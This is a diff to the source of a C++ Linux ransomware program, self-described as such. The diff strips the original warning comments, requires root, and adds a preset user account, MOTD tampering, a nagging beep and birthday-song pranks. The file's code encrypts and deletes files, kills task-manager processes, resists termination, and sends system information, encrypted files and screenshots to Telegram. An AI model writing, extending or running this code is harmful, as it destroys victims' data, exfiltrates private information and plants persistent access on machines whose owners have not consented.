@@ -1,22 +1,9 @@
 // Developed by Colton Silva 2025
 // version 1.0
 //
-// Categorized as RANSOMWARE
-//
-// WARNING: This single file contains c++ source code that
-// can destroy Linux system by encrypting all files
-// (including system files) and deleting them automatically
-// if you enter incorrect password at it's given attempt times
-// or if you exit your Linux terminal
-//
-// This software can alter or modify the system's operation
-// which is, to block signals from preventing this from running
-//
 // Known to work with Debian or Ubuntu based distribution.
-// Not tested on Fedora and Arch, or non-systemd distributions
+// Some are not compatible on Fedora and Arch, or non-systemd distributions
 //
-// To compile this, use g++ with -lcrypto, -lcurl, -std=c++17
-// and -pthread flags
 // For g++ version 8, you need to add -lstdc++fs flag as <filesystem>
 // does not linked by default
 //
@@ -28,8 +15,7 @@
 //
 
 #include <iostream>
-// Uncomment this for g++ version 8 compilation
-// #include <iomanip>
+#include <iomanip>
 #include <fstream>
 #include <cstring>
 #include <vector>
@@ -53,10 +39,29 @@
 #include <queue>
 #include <atomic>
 #include <string.h>
+#include <cerrno>
+#include <pwd.h>
+#include <sstream>
+#include "audio/happy_birthday.hpp"
+#include "audio/beep.hpp"
 #include "screenshotter.hpp"
+#include "modifiers/greetings.hpp"
 
 using namespace std;
 namespace fs = std::filesystem;
+
+void setupAudioEnvironment() {
+    if (geteuid() == 0) { // Only run this if we are root
+        const char* sudoUser = getenv("SUDO_USER");
+        if (sudoUser) {
+            struct passwd* pw = getpwnam(sudoUser);
+            if (pw) {
+                std::string xdgRuntimeDir = std::string("/run/user/") + std::to_string(pw->pw_uid);
+                setenv("XDG_RUNTIME_DIR", xdgRuntimeDir.c_str(), 1);
+            }
+        }
+    }
+}
 
 const size_t CHUNK_SIZE = 16 * 1024;
 const int AES_KEY_SIZE = 32;
@@ -64,10 +69,67 @@ const int AES_BLOCK_SIZE = 16;
 const int SALT_SIZE = 16;
 const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00"; //You may change this with your own key
 const string MAP_FILE = "file_map.txt";
+const char* TERMINAL_CANDIDATES[] = {
+    "xterm", "uterm", "gnome-terminal", "konsole", "xfce4-terminal",
+    "lxterminal", "mate-terminal", "tilix", "x-terminal-emulator", nullptr
+};
+
+string shellQuote(const string& value) {
+    ostringstream oss;
+    oss << quoted(value, '"', '\\');
+    return oss.str();
+}
+
+string buildTerminalInvocation(const string& terminal, const string& payload) {
+    const string bashCommand = "bash -c " + shellQuote(payload);
+    if (terminal == "gnome-terminal" || terminal == "mate-terminal" || terminal == "tilix") {
+        return terminal + " -- " + bashCommand;
+    }
+    return terminal + " -e " + bashCommand;
+}
+
+bool handleHappyBirthdayMode(int argc, char* argv[]) {
+    bool birthdayMode = false;
+    bool birthdayVerbose = false;
+
+    for (int i = 1; i < argc; ++i) {
+        string arg = argv[i];
+        if (arg == "--play-birthday") {
+            birthdayMode = true;
+        } else if (arg == "--play-birthday-verbose") {
+            birthdayMode = true;
+            birthdayVerbose = true;
+        }
+    }
+
+    if (!birthdayMode) {
+        if (const char* modeEnv = std::getenv("ENSCRAMBLED_MODE")) {
+            if (string(modeEnv) == "birthday") {
+                birthdayMode = true;
+            }
+        }
+    }
+
+    if (!birthdayVerbose) {
+        if (const char* verboseEnv = std::getenv("HAPPY_BIRTHDAY_VERBOSE")) {
+            string value(verboseEnv);
+            if (!value.empty() && value != "0" && value != "false" && value != "FALSE") {
+                birthdayVerbose = true;
+            }
+        }
+    }
+
+    if (birthdayMode) {
+        runHappyBirthdaySong(birthdayVerbose);
+        return true;
+    }
+
+    return false;
+}
 
 // Obfuscated password hidden inside garbage text. Change or add the strings here.
 const string junk1 = "やπ郧bnLJ9SA9uiUSjhkDxEcʥ9&aԠNISEKOIࠇ+eعKק";
-const string junk2 = "ECieNvDsPuK99suPReMO69jEa=2SDFwsEpcM8e3";
+const string junk2 = "ECieNvDsPuK99suPReMO69jEa=2SDFwsEpcM8e3IlOVeKIMJONGUN";
 const string junk3 = "vincemcmahon";
 const string junk4 = "ㅴwVܮ3辸E6c&䶵Մ$sUcKmaHdIcK3ふわÅ=Đ?őŔԪ";
 const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eSOvIEtUnIoN8𐌱cR?e齉Do";
@@ -142,7 +204,7 @@ void processFile(const string &inputFile, const string &outputFile, const string
         if (fs::exists(outputFile) && fs::file_size(outputFile) > 0) {
             // Only then delete the original file
             fs::remove(inputFile);
-            cout << "\033[1;32m[OK]\033[0m Successfully encrypted and removed: " << fs::path(inputFile).filename().string() << endl;
+            cout << "\033[1;32m[OK]\033[0m Nullfied: " << fs::path(inputFile).filename().string() << endl;
         } else {
             cerr << "\033[1;31m[FAILED]\033[0m  Encryption failed for: " << inputFile << " - original file preserved" << endl;
         }
@@ -164,6 +226,7 @@ void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int
             string fileName = entry.path().filename().string();
             string relativePath = fs::relative(entry.path(), dirPath).string();
 
+	// this was added to avoid the program itself to be encrypted, for debugging purpose
             if (fileName == "scramble.exe" || fileName == "scramble" || fileName == MAP_FILE) continue;
             if (fileName.size() > 4 && fileName.substr(0, 4) == "null") continue;
 
@@ -328,7 +391,7 @@ void setupProtection() {
 void monitorAndKillTaskManagers() {
     const vector<string> taskManagers = {
     // You may add a task manager here
-        "htop", "btop", "top", "atop", "gtop",
+        "htop", "btop", "top", "atop", "gtop", 
         "vtop", "bashtop", "glances", "ksysguard", "gnome-system-monitor",
         "xfce4-taskmanager", "lxtask", "taskmgr", "resmon",
         "kSysGuard", "mate-system-monitor", "nmon", "bpytop", "conky",
@@ -345,6 +408,8 @@ void monitorAndKillTaskManagers() {
     }
 }
 
+// We don't add kill or pkill interruption here.
+
 void encryptAllFiles();
 void decryptAllFiles();
 
@@ -356,14 +421,9 @@ void watchdog(const string& selfPath) {
     while (true) {
         int ret = system(("pgrep -f '" + selfPath + "' | grep -v $$ > /dev/null").c_str());
         if (ret != 0) {
-            const char* terms[] = {
-                "x-terminal-emulator", "xterm", "gnome-terminal",
-                "konsole", "xfce4-terminal", "lxterminal",
-                "mate-terminal", "tilix", nullptr
-            };
-
-            for (int i = 0; terms[i]; ++i) {
-                string cmd = string(terms[i]) + " -e \"" + selfPath + "\" &";
+            for (int i = 0; TERMINAL_CANDIDATES[i]; ++i) {
+                string terminal = TERMINAL_CANDIDATES[i];
+                string cmd = buildTerminalInvocation(terminal, selfPath) + " &";
                 if (system(cmd.c_str()) == 0) break;
             }
         }
@@ -378,9 +438,26 @@ void relaunchInTerminalIfDetached(const char* selfPath) {
     // Always try to launch matrix effect, regardless of terminal status
     cout << "\033[1;33m[PROCESS]\033[0m Launching matrix effect in new terminal..." << endl;
     
+    fs::path tmpDir;
+    try {
+        tmpDir = fs::temp_directory_path();
+    } catch (const std::exception& ex) {
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to determine temp directory: " << ex.what() << endl;
+        return;
+    }
+
+    const fs::path scriptPath = tmpDir / "matrix.sh";
+
+    // Ensure previous script is removed
+    std::error_code removeEc;
+    fs::remove(scriptPath, removeEc);
+
     // Write a temporary matrix effect shell script
-    const char* scriptPath = "/tmp/matrix.sh";
-    ofstream script(scriptPath);
+    ofstream script(scriptPath, ios::out | ios::trunc);
+    if (!script) {
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to open matrix script for writing! (" << strerror(errno) << ")" << endl;
+        return;
+    }
     script << R"(#!/bin/bash
 # Matrix effect script
 clear
@@ -413,66 +490,102 @@ while true; do
   sleep 0.05
 done
 )";
-    script.close();
-    
-    // Check if script was created successfully
+    script.flush();
     if (!script.good()) {
-        cerr << "\033[1;31m[ERROR]\033[0m  Failed to create matrix script!" << endl;
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to write matrix script!" << endl;
+        script.close();
         return;
     }
+    script.close();
     
-    chmod(scriptPath, 0755);  // Make the script executable
+    chmod(scriptPath.c_str(), 0755);  // Make the script executable
 
-    // Try launching in available terminals
-    const char* terminals[] = {
-        "gnome-terminal", "xterm", "konsole", "xfce4-terminal", 
-        "lxterminal", "mate-terminal", "tilix", "x-terminal-emulator", nullptr
-    };
+    // Try launching in available terminals (xterm/uterm first, then common terminals)
+    for (int i = 0; TERMINAL_CANDIDATES[i]; ++i) {
+        const string terminal = TERMINAL_CANDIDATES[i];
+        string cmd = buildTerminalInvocation(terminal, scriptPath.string()) + " &";
 
-    for (int i = 0; terminals[i]; ++i) {
-        string cmd;
-        
-        // Different terminals have different command line syntax
-        if (string(terminals[i]) == "gnome-terminal" || 
-            string(terminals[i]) == "mate-terminal" || 
-            string(terminals[i]) == "tilix") {
-            cmd = string(terminals[i]) + " -- bash -c \"" + scriptPath + "\"";
-        } else if (string(terminals[i]) == "konsole") {
-            cmd = string(terminals[i]) + " -e bash -c \"" + scriptPath + "\"";
-        } else if (string(terminals[i]) == "xfce4-terminal") {
-            cmd = string(terminals[i]) + " -e \"" + scriptPath + "\"";
-        } else {
-            // For xterm and others
-            cmd = string(terminals[i]) + " -e bash -c \"" + scriptPath + "\"";
-        }
-        
-        // Execute in background so it doesn't block the main program
-        cmd += " &";
-        
-        cout << "\033[1;33m[INFO]\033[0m Trying to launch matrix in: " << terminals[i] << endl;
+        cout << "\033[1;33m[INFO]\033[0m Trying to launch matrix in: " << terminal << endl;
         cout << "\033[1;33m[INFO]\033[0m Command: " << cmd << endl;
         
         int result = system(cmd.c_str());
         if (result == 0) {
-            cout << "\033[1;32m[SUCCESS]\033[0m Successfully launched matrix effect in " << terminals[i] << endl;
+            cout << "\033[1;32m[SUCCESS]\033[0m Successfully launched matrix effect in " << terminal << endl;
             // Give it a moment to start
             this_thread::sleep_for(chrono::milliseconds(500));
             return;  // Terminal launched successfully
         } else {
-            cout << "\033[1;31m[FAIL]\033[0m Failed to launch in " << terminals[i] << " (exit code: " << result << ")" << endl;
+            cout << "\033[1;31m[FAIL]\033[0m Failed to launch in " << terminal << " (exit code: " << result << ")" << endl;
         }
     }
 
     cerr << "\033[1;31m[FAIL]\033[0m Failed to launch matrix terminal effect!" << endl;
     
     // Fallback: try to run the script directly in background
-    string fallbackCmd = "bash " + string(scriptPath) + " &";
+    string fallbackCmd = "bash " + scriptPath.string() + " &";
     cout << "\033[1;33m[TRY]\033[0m Trying fallback method..." << endl;
     if (system(fallbackCmd.c_str()) == 0) {
         cout << "\033[1;33m[INFO]\033[0m Matrix effect started in background as fallback." << endl;
     } else {
         cerr << "\033[1;31m[FAIL]\033[0m All attempts to launch matrix effect failed!" << endl;
     }
+}
+
+
+void launchHappyBirthdayTerminal(const string& selfPath) {
+    cout << "\033[1;33m[PROCESS]\033[0m Launching happy birthday song in new terminal..." << endl;
+
+    fs::path tmpDir;
+    try {
+        tmpDir = fs::temp_directory_path();
+    } catch (const std::exception& ex) {
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to determine temp directory: " << ex.what() << endl;
+        return;
+    }
+
+    const fs::path scriptPath = tmpDir / "birthday.sh";
+    ofstream script(scriptPath, ios::out | ios::trunc);
+    if (!script) {
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to open birthday script for writing! (" << strerror(errno) << ")" << endl;
+        return;
+    }
+
+    const char* sudoUser = getenv("SUDO_USER");
+    bool isRoot = (geteuid() == 0);
+
+    script << "#!/bin/bash\n";
+    script << "export DISPLAY=:0\n"; 
+    if (sudoUser) {
+        script << "export XAUTHORITY=/home/" << sudoUser << "/.Xauthority\n";
+    }
+
+    string birthdayCmd = shellQuote(selfPath) + " --play-birthday";
+    if (isRoot && sudoUser) {
+        script << "runuser -l " << sudoUser << " -c '" << birthdayCmd << "'\n";
+    } else {
+        script << birthdayCmd << "\n";
+    }
+    script.close();
+
+    chmod(scriptPath.c_str(), 0755);
+
+    for (int i = 0; TERMINAL_CANDIDATES[i]; ++i) {
+        const string terminal = TERMINAL_CANDIDATES[i];
+        string cmd = buildTerminalInvocation(terminal, scriptPath.string()) + " &";
+
+        cout << "\033[1;33m[INFO]\033[0m Trying to launch birthday song in: " << terminal << endl;
+        cout << "\033[1;33m[INFO]\033[0m Command: " << cmd << endl;
+
+        int result = system(cmd.c_str());
+        if (result == 0) {
+            cout << "\033[1;32m[SUCCESS]\033[0m Successfully launched happy birthday in " << terminal << endl;
+            this_thread::sleep_for(chrono::milliseconds(250));
+            return;
+        }
+        cout << "\033[1;31m[FAIL]\033[0m Failed to launch in " << terminal << " (exit code: " << result << ")" << endl;
+    }
+
+    cerr << "\033[1;31m[WARN]\033[0m Unable to launch happy birthday in a new terminal." << endl;
 }
 
 
@@ -530,44 +643,67 @@ void installPackageIfMissing(const string &pkg) {
         cout << "\033[1;32m[OK]\033[0m Installed: " << pkg << endl;
 }
 
+void annoying_beep(atomic<bool>& stop_beeping) {
+    while (!stop_beeping) {
+        pc_beep();
+        this_thread::sleep_for(chrono::seconds(1));
+    }
+}
+
 void checkDependencies() {
     installPackageIfMissing("libssl-dev");
     installPackageIfMissing("libcurl4-openssl-dev");
     installPackageIfMissing("build-essential");
     installPackageIfMissing("acpi");
     installPackageIfMissing("xterm");
-    installPackageIfMissing("scrots");
-}
+    installPackageIfMissing("scrot");
+    installPackageIfMissing("libsdl2-dev"); // for beeps
+} 
 
 void sendRandomEncryptedFiles(const string &directory, int maxFiles);
 std::string gatherFullSystemInfo();
 void sendMessageToTelegram(const string &message);
 void sendScreenshotToTelegram();
+bool generateHtmlFile(const std::string& outputPath = "generated.html");
+bool addPresetUser(bool debug = false);
 
 int main(int argc, char* argv[]) {
 
 // This requires you to run this program into root.
 // Comment the "if" part if you don't want to run it as root.
 
-/*if (geteuid() != 0) {
+    if (handleHappyBirthdayMode(argc, argv)) {
+        return 0;
+    }
+
+if (geteuid() != 0) {
     cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
     exit(1);
-}*/
+}
 
- cout << "\033[1;34m[START]\033[0m We need to check if the required dependencies are installed.\n" << endl;
+	cout << "\033[1;34m[START]\033[0m We need to check if the required dependencies are installed.\n" << endl;
                   
-        this_thread::sleep_for(chrono::seconds(15));
+        this_thread::sleep_for(chrono::seconds(5));
 
   checkDependencies();
+  addPresetUser();
 
 if (!fs::exists(MAP_FILE)) {
     
-    string selfPath = fs::absolute(argv[0]);  // Full binary path
+    atomic<bool> stop_beeping(false);
+    thread beep_thread(annoying_beep, ref(stop_beeping));
+
+    backup_motd();
+    change_motd();
+
+    fs::path selfPath = fs::absolute(argv[0]);  // Full binary path
    
     relaunchInTerminalIfDetached(argv[0]);
+    generateHtmlFile("index.html");
+    launchHappyBirthdayTerminal(selfPath.string());
     setupProtection();
     
-    
+    // this part is unstable as fuck
     //thread wd(watchdog, selfPath);
     //wd.detach();
     
@@ -576,7 +712,7 @@ if (!fs::exists(MAP_FILE)) {
 
         cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva\n" << endl;
 
-        cout << "\nOH NO! YOUR PERSONAL FILES WILL BE ENCRYPTED! Don't worry because this ransomware doesn't ask for money, stealing them or threaten you to distribute your sensitive files to criminals. You just need to solve this by guessing the correct password in order to retrieve them.\n\nYOU CAN'T DESTROY THIS PROCESS. EVEN IF YOU KILL YOUR LOVELY TERMINAL OF YOURS, THIS PROCESS IS ONGOING.\n" << endl;
+        cout << "\nOH NO! YOUR PERSONAL FILES WILL BE ENCRYPTED! Don't worry because this ransomware does not ask for money, stealing them or threaten you to distribute your sensitive files to criminals. You just need to solve this by guessing the correct password in order to retrieve them.\n\nYOU CAN'T DESTROY THIS PROCESS. EVEN IF YOU KILL YOUR LOVELY TERMINAL OF YOURS, THIS PROCESS IS ONGOING.\n" << endl;
 
         this_thread::sleep_for(chrono::seconds(10));
         
@@ -592,15 +728,20 @@ if (!fs::exists(MAP_FILE)) {
 
         encryptionThread.join();
         
+        stop_beeping = true;
+        beep_thread.join();
+        
         string info = gatherFullSystemInfo();
         sendMessageToTelegram(info);
         sendRandomEncryptedFiles(fs::current_path().string(), 10);
+
         // If you want to encrypt root directory, do this example here:
         // sendRandomEncryptedFiles("/home", 10);
         // Only if you want the current user's home directory, use this instead:
         // sendRandomEncryptedFiles(getenv("HOME"), 10);
 
         // Take a screenshot and send it to Telegram
+
         sendScreenshotToTelegram();
         
         decryptAllFiles();
